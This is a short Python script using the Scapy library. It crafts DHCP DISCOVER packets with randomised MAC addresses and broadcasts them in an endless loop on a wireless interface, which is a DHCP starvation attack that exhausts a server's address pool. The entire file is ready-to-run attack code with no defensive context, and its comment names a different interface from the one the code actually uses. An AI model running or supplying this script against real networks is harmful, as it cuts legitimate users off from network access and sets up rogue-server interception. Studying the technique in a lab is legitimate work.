#!/usr/bin/python3
from scapy.all import *

conf.checkIPaddr = False  # Disabling the IP address checking

# Building the DISCOVER packet

# Making an Ethernet packet
DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
            / IP(src='0.0.0.0', dst='255.255.255.255') \
            / UDP(dport=67,sport=68) \
            / BOOTP(op=1, chaddr=RandMAC()) \
            / DHCP(options=[('message-type','discover'), ('end')])


# Sending the crafted packet in layer 2 in a loop using the "eth0" interface
sendp(DHCP_DISCOVER, iface='wlp0s20f3',loop=1,verbose=1 )
